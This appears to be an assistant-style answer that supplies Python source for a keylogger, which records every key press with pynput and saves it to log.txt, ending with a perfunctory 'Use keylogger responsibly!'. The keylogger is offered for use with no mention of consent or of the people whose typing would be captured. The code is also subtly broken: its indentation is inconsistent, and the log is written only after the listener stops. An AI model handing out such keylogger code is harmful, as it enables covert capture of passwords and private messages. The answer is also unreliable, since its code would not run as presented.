Here's how you can create the python keylogger:
```python
from pynput import keyboard
 
#store logged data in this string
keys=""
 
def on_key_press(key):
    global keys  # So we can modify the global keys variable.
   try:        
       keys = keys + str(key.char)+' '  
   except:     
        if key == keyboard.Key.space:
            keys=keys+' '
        else: 
            keys=keys+str(key)+' '           
 
def write_to_file(): 
    with open('log.txt','w') as f:   
       f.write(keys)  # writes the keystrokes we logged into log.txt 
 
with keyboard.Listener(on_press=on_key_press) as listener: 
     listener.join()   
 
write_to_file()        
``` 
Please note that continuous running of this script may cause your entire system to slow down or even crash, because it's constantly listening and creating an ever-growing log. Use keylogger responsibly!